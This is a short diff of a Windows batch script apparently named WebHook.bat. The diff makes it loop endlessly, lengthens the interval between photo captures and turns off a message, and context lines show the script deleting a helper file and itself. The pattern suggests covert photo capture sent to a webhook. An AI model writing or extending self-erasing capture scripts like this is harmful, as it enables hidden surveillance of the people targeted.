@@ -27,13 +27,14 @@ set DESTINATION=WebHook.bat
 
 set version=2025-02-01T10
 
+:recommencer
 
 set photo=true
     set NbPhoto=2
-    set TempsEntre=0.5
+    set TempsEntre=10
 ::
 
-set message=true
+set message=false
     set MESSAGE1=Bonjour
 ::
 
@@ -175,5 +176,7 @@ del "%chemin_vbs%"
 del "%~f0"
 
 :finversion
+
+goto :recommencer
 
 
